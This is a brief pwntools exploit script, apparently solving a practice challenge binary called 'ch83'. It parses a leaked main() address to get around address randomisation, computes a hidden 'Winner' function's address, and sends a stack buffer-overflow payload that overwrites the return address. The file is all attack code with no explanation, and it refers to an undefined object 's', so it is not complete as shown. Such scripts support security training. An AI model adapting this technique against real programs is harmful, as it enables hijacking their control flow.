from pwn import * 


sh= s.process("ch83")
sh.recvline() # b"I'm an unbreakable safe, so you need a key to enter!\n"
leak = sh.recvline() # b'Hint, main(): 0x562887bba91a\n'
main_addr = int(leak[14:-1].decode("utf-8") , 16)  
Winner = main_addr - 160 
print("[+] main address = "+hex(main_addr))
print("[+] Winner address  = "+hex(Winner))
payload = b'\xff'*32 + b'\xbb'*8 + p64(Winner)
sh.sendline(payload)
print(sh.recvall())
